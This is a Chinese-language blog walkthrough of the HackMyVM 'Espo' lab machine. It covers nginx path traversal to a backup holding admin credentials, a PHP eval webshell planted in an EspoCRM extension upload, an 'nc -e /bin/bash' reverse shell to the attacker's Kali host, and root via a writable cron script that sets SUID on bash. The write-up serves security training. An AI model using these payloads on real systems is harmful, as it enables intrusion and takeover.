@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>hackmyvm-Espo · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-03-18">2025年3月18日</time>
+        
+        
+          <span class="post__readtime">8 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/hackmyvm/">#hackmyvm</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">hackmyvm-Espo</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <p><a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Espo">靶机地址</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>主机发现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24                                                          </span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:3e:b3:0d       (Unknown)</span><br><span class="line">192.168.56.117  08:00:27:38:1e:5d       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.901 seconds (134.67 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p><code>192.168.56.117</code>是我的靶机的地址</p>
+<p>端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sC -sV 192.168.56.117</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 12:22 EDT</span><br><span class="line">Nmap scan report for 192.168.56.117</span><br><span class="line">Host is up (0.0063s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)</span><br><span class="line">|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-title: EspoCRM</span><br><span class="line">MAC Address: 08:00:27:38:1E:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds</span><br></pre></td></tr></table></figure>
+
+<p>一个ssh与web页面</p>
+<p><strong>80端口web页面</strong></p>
+<p>80端口就是一个登录框</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180023943.png" alt="image-20250318002335847"></p>
+<p>对我来说这种用户登录数据包不太好爆破</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180025484.png" alt="image-20250318002552388"></p>
+<p><strong>页面指纹信息收集</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# whatweb 192.168.56.117            </span><br><span class="line">http://192.168.56.117 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.56.117], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx</span><br></pre></td></tr></table></figure>
+
+<p>nginx中间件。EspoCRM</p>
+<p>经过查找EspoCRM 没有什么可以利用的漏洞。(但是有一个CVE是可以在插件安装页面上传php代码，我寻思这不是正常功能吗?……)</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180039153.png" alt="image-20250318003954826"></p>
+<p>有一个<code>admin</code>路由(<code>robots.txt</code>里面没什么东西)</p>
+<p>这个nginx中间件有一个目录穿越的漏洞</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180041069.png" alt="image-20250318004103006"></p>
+<p>找出来一个<code>_oldsite</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180045822.png" alt="image-20250318004541580"></p>
+<p>又找出来一个<code>info</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# curl 192.168.56.117/admin../_oldsite/info</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Backup Configuration Settings</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This configuration file dictates the backup protocols <span class="keyword">for</span> critical data storage.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Directory <span class="keyword">for</span> storing backup files</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">All backup files are stored <span class="keyword">in</span> compressed ZIP format <span class="keyword">for</span> efficient space usage and security.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ensure that backups are regularly updated and verified <span class="keyword">for</span> data integrity.</span></span><br><span class="line"></span><br><span class="line">backup_directory: /admin/_oldsite</span><br><span class="line">backup_format: zip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Note: The backup directory is designated <span class="keyword">for</span> ZIP file backups only.</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Regular maintenance and checks are required to ensure data consistency and reliability.</span></span><br></pre></td></tr></table></figure>
+
+<p>有zip网站备份</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180051854.png" alt="image-20250318005110558"></p>
+<p>这个<code>backup.zip</code>下载下来就是网站源码了</p>
+<p>在<code>data/config.php</code>中记录着管理员账号和密码</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180052777.png" alt="image-20250318005253667"></p>
+<p>登录进去之后，来到管理员面板。配置扩展这块</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180054011.png" alt="image-20250318005450889"></p>
+<p>我在<a target="_blank" rel="noopener" href="https://www.espocrm.com/extensions/">官方网站</a>上面找了一个免费的拓展将它下载了下来</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180055963.png" alt="image-20250318005535710"></p>
+<p>你可能会遇到这个错误</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180058808.png" alt="image-20250318005815755"></p>
+<p>这个时候你需要将<code>manifest.json</code>里面的<code>acceptableVersions</code>的值修改一下。修改成7.2.4以下的</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180059859.png" alt="image-20250318005918732"></p>
+<p>然后在<code>Extension</code>的源码里面插入你的<code>webshell</code>之后,再次压缩成zip上传它</p>
+<p>这个时候你也许会遇到一个新问题<code>It&#39;s not an Installation package.</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180104899.png" alt="image-20250318010440853"></p>
+<p>那是因为zip里面的目录结构必须要是左边的这样不能是右边的</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180106907.png" alt="image-20250318010610828"></p>
+<p>上传成功之后安装它！</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180107512.png" alt="image-20250318010715447"></p>
+<p>我插入的<code>@eval($_REQUEST[&#39;a&#39;]);    die(phpinfo());</code>语句太多了自己给靶机的web环境干炸了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180107560.png" alt="image-20250318010739490"></p>
+<p>刚才测试上传zip的时候的那个数据包还在我的<code>BurpSuite</code>的<code>Repeater</code>的模块中</p>
+<p>我尝试点一下<code>Send</code>页面返回了<code>phpinfo()</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180110129.png" alt="image-20250318011006050"></p>
+<p>成功命令执行</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180110554.png" alt="image-20250318011043445"></p>
+<p>这里不知道为什么我的蚁剑连接不上去</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180111898.png" alt="image-20250318011133824"></p>
+<p>还是反弹一个shell到我的kali上面去吧<code>nc -e /bin/bash 192.168.56.103 7777</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -lvkp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.117: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.56.103] from (UNKNOWN) [192.168.56.117] 41572</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>拿上来一个<code>pspy64</code>看了看进程</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180116114.png" alt="image-20250318011627823"></p>
+<p><code>root</code>用户会定时执行<code>cron.php</code></p>
+<p>同时我们可以编辑<code>cron.php</code>  哎！我有一个想法🤓👆</p>
+<p>我们给<code>cron.php</code>写入<code>system(&quot;chmod +s /bin/bash&quot;);</code>🤓👆</p>
+<p>然后等一会<code>bash</code>就有了s权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180121256.png" alt="image-20250318012153202"></p>
+<p>这个时候我们只需要<code>bash -p</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503180122985.png" alt="image-20250318012229804"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-09-18">2025·09·18</time>
+          <a class="related__link" href="/2025/09/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Democracy/">hackmyvm-Democracy</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-04-04">2025·04·04</time>
+          <a class="related__link" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/">hackmyvm-Principle</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-03-15">2025·03·15</time>
+          <a class="related__link" href="/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/">hackmyvm-HackingToys</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">hackmyvm-Principle</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">hackmyvm-HackingToys</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
